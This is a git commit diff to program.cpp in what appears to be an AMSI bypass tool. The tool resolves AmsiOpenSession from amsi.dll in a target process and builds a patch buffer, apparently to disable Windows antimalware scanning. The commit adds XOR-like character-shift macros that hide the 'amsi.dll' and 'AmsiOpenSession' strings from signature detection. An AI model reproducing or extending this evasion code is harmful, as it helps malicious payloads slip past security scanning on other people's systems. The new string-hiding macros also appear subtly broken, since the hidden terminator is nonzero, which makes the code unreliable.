bb9d5a5d07d456acc3d86a300fbca6c41e0830b4
Max Power <florylsk@gmail.com>
2023-02-25 08:21:26 -0500

    Further compiler-time obfuscation

--- program.cpp
+++ program.cpp
@@ -7,7 +7,9 @@
 #ifndef NT_SUCCESS
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
 #endif
-
+#define HIDE_LETTER(a)   (a) + 0x50
+#define UNHIDE_STRING(str)  do { char * ptr = str ; while (*ptr) *ptr++ -= 0x50; } while(0)
+#define HIDE_STRING(str)  do {char * ptr = str ; while (*ptr) *ptr++ += 0x50;} while(0)
 
 
 
@@ -42,10 +44,13 @@ DWORD64 GetAddr(LPVOID addr) {
 
 DWORD64 patch(HANDLE hproc) {
 	OBF_BEGIN
-	char ams1[] = { 'a','m','s','i','.','d','l','l',0 };
-	char ams10pen[] = { 'A','m','s','i','O','p','e','n','S','e','s','s','i','o','n',0 };
+	char ams1[] = { HIDE_LETTER('a'),HIDE_LETTER('m'),HIDE_LETTER('s'),HIDE_LETTER('i'),HIDE_LETTER('.'),HIDE_LETTER('d'),HIDE_LETTER('l'),HIDE_LETTER('l'),HIDE_LETTER(0) };
+	char ams10pen[] = { HIDE_LETTER('A'),HIDE_LETTER('m'),HIDE_LETTER('s'),HIDE_LETTER('i'),HIDE_LETTER('O'),HIDE_LETTER('p'),HIDE_LETTER('e'),HIDE_LETTER('n'),HIDE_LETTER('S'),HIDE_LETTER('e'),HIDE_LETTER('s'),HIDE_LETTER('s'),HIDE_LETTER('i'),HIDE_LETTER('o'),HIDE_LETTER('n'),HIDE_LETTER(0) };
+	UNHIDE_STRING(ams1);
+	UNHIDE_STRING(ams10pen);
 	void* ptr = GetProcAddress(LoadLibraryA(ams1), ams10pen);
-
+	HIDE_STRING(ams1);
+	HIDE_STRING(ams10pen);
 	char Patch[100];
 	ZeroMemory(Patch, 100);
 	lstrcatA(Patch, "\x75");
